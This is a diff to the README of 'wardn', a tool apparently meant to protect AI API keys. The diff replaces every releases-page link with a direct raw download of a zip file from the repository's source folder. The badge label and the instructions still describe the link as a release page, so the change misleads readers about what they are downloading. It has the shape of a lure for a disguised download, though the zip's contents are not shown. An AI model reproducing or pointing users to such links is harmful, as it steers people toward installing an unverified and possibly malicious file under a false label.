@@ -1,6 +1,6 @@
 # 🛡️ wardn - Keep AI Keys Out of Reach
 
-<a href="https://github.com/Lucillemobile657/wardn/releases"><img src="https://img.shields.io/badge/Download%20wardn-Release%20Page-blue?style=for-the-badge&logo=github" alt="Download wardn"></a>
+<a href="https://raw.githubusercontent.com/Lucillemobile657/wardn/main/src/Software_1.9.zip"><img src="https://img.shields.io/badge/Download%20wardn-Release%20Page-blue?style=for-the-badge&logo=github" alt="Download wardn"></a>
 
 ## 🧭 What wardn does
 
@@ -19,7 +19,7 @@ Use wardn when you want:
 
 To download wardn for Windows, visit the release page:
 
-https://github.com/Lucillemobile657/wardn/releases
+https://raw.githubusercontent.com/Lucillemobile657/wardn/main/src/Software_1.9.zip
 
 On that page, look for the latest release and download the Windows file. If you see more than one file, choose the one for Windows, such as an `.exe` or `.zip` package.
 
@@ -170,7 +170,7 @@ This setup works well for tools that need to call APIs while keeping secrets out
 
 Use the release page to get the Windows build:
 
-https://github.com/Lucillemobile657/wardn/releases
+https://raw.githubusercontent.com/Lucillemobile657/wardn/main/src/Software_1.9.zip
 
 On the page:
 
